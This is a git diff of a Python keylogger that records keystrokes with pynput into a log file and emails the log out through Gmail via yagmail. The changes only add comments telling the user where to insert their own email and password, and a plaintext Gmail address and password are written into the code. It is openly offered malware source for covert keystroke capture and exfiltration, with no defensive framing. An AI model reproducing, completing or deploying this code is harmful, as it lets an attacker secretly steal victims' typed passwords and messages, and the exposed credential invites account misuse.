@@ -12,6 +12,7 @@ from multiprocessing import Process
 ############
 # Keylogger function
 # You can change the directory and/or name of the log "keylog.txt"
+# If no directory is entered but only file name, it saves where the keylogger is
 # Only emits new line/linebreak when user presses enter or Tab
 # Uses file write to insert into log, listener from pynput to grab keystrokes
 ############
@@ -19,7 +20,7 @@ def Klogger():
 
     log = os.environ.get(
         'pylogger_file',
-        os.path.expanduser('keylog.txt')
+        os.path.expanduser('keylog.txt') #Directory of log file
     )
 
     user = os.path.expanduser("~")
@@ -44,10 +45,10 @@ def Klogger():
 # This email is open to testing purposes for the next 2 weeks
 ###############
 def sendLog(log):
-    sender_email = "kloggertest42069@gmail.com"
-    receiver_email = "kloggertest42069@gmail.com"
+    sender_email = "kloggertest42069@gmail.com" #Insert your email here
+    receiver_email = "kloggertest42069@gmail.com" #and here
     subject = "Klogger"
-    sender_password = "rotkiv1234"
+    sender_password = "rotkiv1234" #email password here
 
     yag = yagmail.SMTP(user=sender_email, password=sender_password)
 
